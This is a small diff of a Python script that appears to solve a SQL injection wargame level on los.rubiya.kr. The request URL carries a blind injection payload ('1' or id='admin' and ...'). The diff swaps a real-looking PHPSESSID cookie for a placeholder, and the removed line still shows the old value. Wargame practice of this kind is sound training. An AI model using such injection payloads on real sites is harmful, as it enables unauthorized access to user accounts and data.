@@ -1,7 +1,7 @@
 import requests
 
 url = "https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?pw=1' or id='admin' and "
-head = {'Cookie' : 'PHPSESSID=hs9ec08q7cfg9e4b8opujaufgg'}
+head = {'Cookie' : 'PHPSESSID=값'}
 
 length = 1
 pwd = ''
